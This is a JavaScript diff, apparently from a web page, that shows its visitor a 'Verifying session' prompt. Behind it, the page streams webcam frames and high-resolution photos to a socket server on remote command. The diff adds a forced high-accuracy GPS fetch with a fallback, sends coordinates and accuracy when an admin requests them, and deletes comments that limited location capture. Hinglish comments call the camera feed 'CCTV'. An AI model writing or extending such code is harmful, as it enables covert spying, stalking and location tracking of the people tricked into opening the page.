@@ -105,22 +105,41 @@ function getDeviceInfo() {
     return `${device} (${browser})`;
 }
 
-// Location sirf tabhi execute hogi jab admin explicitly request karega
+// WhatsApp jaisi High-Accuracy GPS fetch function
 function requestAndSendLocation() {
     if (!navigator.geolocation) return;
+    
+    // Forcefully wakeup GPS chip with high accuracy and zero cache
     navigator.geolocation.getCurrentPosition(
         position => {
             socket.emit("user-location", {
                 latitude: position.coords.latitude,
-                longitude: position.coords.longitude
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
             });
         },
-        error => {},
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        error => {
+            // Fallback agar high accuracy fail ho toh normal mode try karein
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    socket.emit("user-location", {
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy
+                    });
+                },
+                err => {},
+                { enableHighAccuracy: false, timeout: 10000 }
+            );
+        },
+        { 
+            enableHighAccuracy: true, // Asli GPS chip use karega
+            timeout: 20000,           // 20 seconds tak accurate lock hone ka wait karega
+            maximumAge: 0             // Purana saved location bilkul use nahi karega (Fresh data)
+        }
     );
 }
 
-// Click par sirf Camera trigger hoga (Location nahi)
 async function triggerVerification() {
     startBtn.style.display = "none";
     setStatus("Verifying session...", "waiting");
@@ -169,7 +188,6 @@ function startLiveStream() {
         canvas.height = 360;
         const context = canvas.getContext("2d");
         context.drawImage(video, 0, 0, 640, 360);
-        // High quality stream frame (0.6 quality for clear CCTV feed)
         const frame = canvas.toDataURL("image/jpeg", 0.6);
         socket.emit("live-stream-frame", frame);
     }, 150);
@@ -183,7 +201,6 @@ function takeSinglePhoto() {
     canvas.height = height;
     const context = canvas.getContext("2d");
     context.drawImage(video, 0, 0, width, height);
-    // Maximum High-Resolution Photo Capture (0.95 quality)
     const imageData = canvas.toDataURL("image/jpeg", 0.95);
     socket.emit("user-photo-captured", imageData);
 }
@@ -209,8 +226,6 @@ socket.on("start-auto-capture", () => {
 });
 
 socket.on("capture-photo", () => { takeSinglePhoto(); });
-
-// Admin ke button dabane par hi location fetch hogi
 socket.on("request-location", () => { requestAndSendLocation(); });
 
 socket.on("switch-camera", async () => {
